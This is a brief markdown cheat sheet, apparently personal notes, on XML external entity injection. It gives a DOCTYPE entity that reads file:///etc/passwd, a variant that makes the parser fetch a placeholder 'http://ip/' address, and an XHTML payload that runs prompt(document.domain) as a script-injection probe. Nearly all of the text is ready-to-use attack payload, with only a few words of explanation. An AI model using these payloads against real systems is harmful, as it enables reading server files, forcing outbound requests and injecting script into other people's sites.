# XML-XXE-Injection



 # it is work like this 
 
 1. <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ] >
 2. and  we call by this   &xxe;
         or 
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://ip/"> ] >
    &xxe;


Payload 

<?xml version="1.0" encoding="UTF-8"?>
<html xmlns:html="w3.org/1999/xhtml">
<html:script>prompt(document.domain);</html:script>
</html>
